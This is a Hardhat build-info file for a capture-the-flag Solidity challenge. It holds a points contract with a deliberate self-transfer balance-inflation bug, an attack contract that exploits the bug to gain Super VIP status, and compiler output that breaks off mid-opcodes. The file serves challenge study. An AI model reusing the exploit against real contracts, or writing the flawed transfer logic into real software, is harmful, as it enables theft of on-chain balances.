{
	"id": "1b74f0108c57c7363d32658fa39af00e",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.4.26",
	"solcLongVersion": "0.4.26+commit.4563c3fc",
	"input": {
		"language": "Solidity",
		"sources": {
			"赛题-预赛/第二题/SvipAttack.sol": {
				"content": "pragma solidity ^0.4.24;\r\nimport \"./SVip.sol\";\r\ncontract svipAttack{\r\n    SVip sv;\r\n    constructor(address _addr){\r\n        sv = SVip(_addr);\r\n    }\r\n    function get()public{\r\n        for(uint i =0;i<99;i++){\r\n            sv.getPoint();\r\n        }\r\n    }\r\n    function transfer()public{\r\n        for(uint i=0;i<11;i++){\r\n            sv.transferPoints(address(this),98);\r\n        }\r\n        sv.transferPoints(msg.sender,1000);\r\n    }\r\n}"
			},
			"赛题-预赛/第二题/SVip.sol": {
				"content": "pragma solidity ^0.4.24;\r\n\r\ncontract SVip {\r\n    mapping(address => uint) public points;\r\n    mapping(address => bool) public isSuperVip;\r\n    uint256 public numOfFree;\r\n\r\n    function promotionSVip() public {\r\n        require(points[msg.sender] >= 999, \"Sorry, you don't have enough points\");\r\n        isSuperVip[msg.sender] = true;\r\n    }\r\n\r\n    function getPoint() public{\r\n        require(numOfFree < 100);\r\n        points[msg.sender] += 1;\r\n        numOfFree++;\r\n    }\r\n    \r\n    function transferPoints(address to, uint256 amount) public {\r\n        uint256 tempSender = points[msg.sender];\r\n        uint256 tempTo = points[to];\r\n        require(tempSender > amount);\r\n        require(tempTo + amount > amount);\r\n        points[msg.sender] = tempSender - amount;\r\n        points[to] = tempTo + amount;\r\n    }\r\n\r\n    function isComplete() public view  returns(bool) {\r\n        require(isSuperVip[msg.sender]);\r\n        return true;\r\n    }\r\n\r\n}\r\n// contract svipAttack{\r\n//     SVip sv;\r\n//     constructor(address _addr){\r\n//         sv = SVip(_addr);\r\n//     }\r\n//     function get()public{\r\n//         for(uint i =0;i<99;i++){\r\n//             sv.getPoint();\r\n//         }\r\n//     }\r\n//     function transfer()public{\r\n//         for(uint i=0;i<11;i++){\r\n//             sv.transferPoints(address(this),98);\r\n//         }\r\n//         sv.transferPoints(msg.sender,1000);\r\n//     }\r\n// }"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"赛题-预赛/第二题/SVip.sol": {
				"SVip": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"name": "to",
									"type": "address"
								},
								{
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferPoints",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"name": "",
									"type": "address"
								}
							],
							"name": "points",
							"outputs": [
								{
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"name": "",
									"type": "address"
								}
							],
							"name": "isSuperVip",
							"outputs": [
								{
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "getPoint",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "isComplete",
							"outputs": [
								{
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "promotionSVip",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "numOfFree",
							"outputs": [
								{
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"赛题-预赛/第二题/SVip.sol\":28:947  contract SVip {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"赛题-预赛/第二题/SVip.sol\":28:947  contract SVip {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第二题/SVip.sol\":28:947  contract SVip {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x326f823f\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x358b8166\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x4095da72\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x5bea9faa\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xb2fa1c9e\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xdb78cdad\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xfab1512e\n      eq\n      tag_8\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_9:\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n      pop\n      tag_10\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_11)\n    tag_10:\n      stop\n        /* \"赛题-预赛/第二题/SVip.sol\":49:87  mapping(address => uint) public points */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_12:\n        /* \"赛题-预赛/第二题/SVip.sol\":49:87  mapping(address => uint) public points */\n      pop\n      tag_13\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_14)\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":94:136  mapping(address => bool) public isSuperVip */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_15:\n        /* \"赛题-预赛/第二题/SVip.sol\":94:136  mapping(address => bool) public isSuperVip */\n      pop\n      tag_16\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_17)\n    tag_16:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_18:\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n      pop\n      tag_19\n      jump(tag_20)\n    tag_19:\n      stop\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_21:\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n      pop\n      tag_22\n      jump(tag_23)\n    tag_22:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_24:\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n      pop\n      tag_25\n      jump(tag_26)\n    tag_25:\n      stop\n        /* \"赛题-预赛/第二题/SVip.sol\":143:167  uint256 public numOfFree */\n    tag_8:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_27:\n        /* \"赛题-预赛/第二题/SVip.sol\":143:167  uint256 public numOfFree */\n      pop\n      tag_28\n      jump(tag_29)\n    tag_28:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n    tag_11:\n        /* \"赛题-预赛/第二题/SVip.sol\":555:573  uint256 tempSender */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":605:619  uint256 tempTo */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":576:582  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":576:594  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":583:593  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":576:594  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      sload\n        /* \"赛题-预赛/第二题/SVip.sol\":555:594  uint256 tempSender = points[msg.sender] */\n      swap2\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":622:628  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":622:632  points[to] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":629:631  to */\n      dup6\n        /* \"赛题-预赛/第二题/SVip.sol\":622:632  points[to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      sload\n        /* \"赛题-预赛/第二题/SVip.sol\":605:632  uint256 tempTo = points[to] */\n      swap1\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":664:670  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":651:661  tempSender */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":651:670  tempSender > amount */\n      gt\n        /* \"赛题-预赛/第二题/SVip.sol\":643:671  require(tempSender > amount) */\n      iszero\n      iszero\n      tag_31\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_31:\n        /* \"赛题-预赛/第二题/SVip.sol\":708:714  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":699:705  amount */\n      dup4\n        /* \"赛题-预赛/第二题/SVip.sol\":690:696  tempTo */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":690:705  tempTo + amount */\n      add\n        /* \"赛题-预赛/第二题/SVip.sol\":690:714  tempTo + amount > amount */\n      gt\n        /* \"赛题-预赛/第二题/SVip.sol\":682:715  require(tempTo + amount > amount) */\n      iszero\n      iszero\n      tag_32\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_32:\n        /* \"赛题-预赛/第二题/SVip.sol\":760:766  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":747:757  tempSender */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":747:766  tempSender - amount */\n      sub\n        /* \"赛题-预赛/第二题/SVip.sol\":726:732  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":726:744  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":733:743  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":726:744  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n        /* \"赛题-预赛/第二题/SVip.sol\":726:766  points[msg.sender] = tempSender - amount */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":799:805  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":790:796  tempTo */\n      dup2\n        /* \"赛题-预赛/第二题/SVip.sol\":790:805  tempTo + amount */\n      add\n        /* \"赛题-预赛/第二题/SVip.sol\":777:783  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":777:787  points[to] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":784:786  to */\n      dup7\n        /* \"赛题-预赛/第二题/SVip.sol\":777:787  points[to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n        /* \"赛题-预赛/第二题/SVip.sol\":777:805  points[to] = tempTo + amount */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":49:87  mapping(address => uint) public points */\n    tag_14:\n      mstore(0x20, 0x0)\n      dup1\n      0x0\n      mstore\n      keccak256(0x0, 0x40)\n      0x0\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":94:136  mapping(address => bool) public isSuperVip */\n    tag_17:\n      mstore(0x20, 0x1)\n      dup1\n      0x0\n      mstore\n      keccak256(0x0, 0x40)\n      0x0\n      swap2\n      pop\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n    tag_20:\n        /* \"赛题-预赛/第二题/SVip.sol\":405:408  100 */\n      0x64\n        /* \"赛题-预赛/第二题/SVip.sol\":393:402  numOfFree */\n      sload(0x2)\n        /* \"赛题-预赛/第二题/SVip.sol\":393:408  numOfFree < 100 */\n      lt\n        /* \"赛题-预赛/第二题/SVip.sol\":385:409  require(numOfFree < 100) */\n      iszero\n      iszero\n      tag_34\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_34:\n        /* \"赛题-预赛/第二题/SVip.sol\":442:443  1 */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":420:426  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":420:438  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":427:437  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":420:438  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":420:443  points[msg.sender] += 1 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":454:463  numOfFree */\n      0x2\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":454:465  numOfFree++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      0x1\n      add\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n    tag_23:\n        /* \"赛题-预赛/第二题/SVip.sol\":864:868  bool */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":889:899  isSuperVip */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":889:911  isSuperVip[msg.sender] */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":900:910  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":889:911  isSuperVip[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      0x0\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"赛题-预赛/第二题/SVip.sol\":881:912  require(isSuperVip[msg.sender]) */\n      iszero\n      iszero\n      tag_36\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_36:\n        /* \"赛题-预赛/第二题/SVip.sol\":930:934  true */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":923:934  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n    tag_26:\n        /* \"赛题-预赛/第二题/SVip.sol\":249:252  999 */\n      0x3e7\n        /* \"赛题-预赛/第二题/SVip.sol\":227:233  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":227:245  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":234:244  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":227:245  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      sload\n        /* \"赛题-预赛/第二题/SVip.sol\":227:252  points[msg.sender] >= 999 */\n      lt\n      iszero\n        /* \"赛题-预赛/第二题/SVip.sol\":219:292  require(points[msg.sender] >= 999, \"Sorry, you don't have enough points\") */\n      iszero\n      iszero\n      tag_38\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536f7272792c20796f7520646f6e2774206861766520656e6f75676820706f69\n      dup2\n      mstore\n      0x20\n      add\n      0x6e74730000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_38:\n        /* \"赛题-预赛/第二题/SVip.sol\":328:332  true */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":303:313  isSuperVip */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":303:325  isSuperVip[msg.sender] */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":314:324  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":303:325  isSuperVip[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":303:332  isSuperVip[msg.sender] = true */\n      0x100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":143:167  uint256 public numOfFree */\n    tag_29:\n      sload(0x2)\n      dup2\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820e8fafd8e41be42ff3d1dff337a93cce2cbd8709bf3fd67419ca36783a238b7130029\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506105b6806100206000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063326f823f14610088578063358b8166146100d55780634095da721461012c5780635bea9faa14610187578063b2fa1c9e1461019e578063db78cdad146101cd578063fab1512e146101e4575b600080fd5b34801561009457600080fd5b506100d3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061020f565b005b3480156100e157600080fd5b50610116600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610342565b6040518082815260200191505060405180910390f35b34801561013857600080fd5b5061016d600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035a565b604051808215151515815260200191505060405180910390f35b34801561019357600080fd5b5061019c61037a565b005b3480156101aa57600080fd5b506101b36103ec565b604051808215151515815260200191505060405180910390f35b3480156101d957600080fd5b506101e261044d565b005b3480156101f057600080fd5b506101f9610584565b6040518082815260200191505060405180910390f35b6000806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205491506000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905082821115156102a257600080fd5b828382011115156102b257600080fd5b8282036000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508281016000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050505050565b60006020528060005260406000206000915090505481565b60016020528060005260406000206000915054906101000a900460ff1681565b606460025410151561038b57600080fd5b60016000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550600260008154809291906001019190505550565b6000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151561044657600080fd5b6001905090565b6103e76000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561052b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260238152602001807f536f7272792c20796f7520646f6e2774206861766520656e6f75676820706f6981526020017f6e7473000000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b60018060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550565b600254815600a165627a7a72305820e8fafd8e41be42ff3d1dff337a93cce2cbd8709bf3fd67419ca36783a238b7130029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5B6 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x326F823F EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0x358B8166 EQ PUSH2 0xD5 JUMPI DUP1 PUSH4 0x4095DA72 EQ PUSH2 0x12C JUMPI DUP1 PUSH4 0x5BEA9FAA EQ PUSH2 0x187 JUMPI DUP1 PUSH4 0xB2FA1C9E EQ PUSH2 0x19E JUMPI DUP1 PUSH4 0xDB78CDAD EQ PUSH2 0x1CD JUMPI DUP1 PUSH4 0xFAB1512E EQ PUSH2 0x1E4 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD3 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x20F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x116 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x342 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x138 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x35A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x193 JUMPI PUSH1 